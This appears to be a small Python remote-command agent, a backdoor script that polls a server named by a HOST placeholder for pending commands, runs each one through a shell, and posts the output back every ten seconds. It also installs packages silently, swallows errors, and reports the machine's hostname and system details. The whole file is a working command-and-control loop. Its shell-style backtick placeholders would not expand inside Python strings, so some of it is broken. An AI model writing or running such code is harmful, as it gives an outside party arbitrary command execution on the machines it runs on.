#!`which python`

packages=['requests','json']

try:
    from pip._internal import main
    for p in packages:
        main(('install',p,))
except:
    pass

HOSTNAME="`hostname`"
UNAME="`uname -a`"
HOST="`echo $HOST`"

import requests
import time
import json
import subprocess


def do_cmd(cmd):
    return subprocess.check_output(cmd,shell=True).decode().strip()


while True:
    r=requests.post('http://'+HOST+'/get_pending', data={
        'hostname':HOSTNAME,
        'uname':UNAME
    })
    control=json.loads(r.text)
    open('log','a').write(r.text)
    response=dict()
    if len(control['cmds']) > 0:
        response['cmds'] = [
            (cmd, do_cmd(cmd),)
            for cmd in control['cmds']
        ]
    if len(response) > 0:
        requests.post('http://'+HOST+'/submit_pending',data=response)
    time.sleep(10)
    

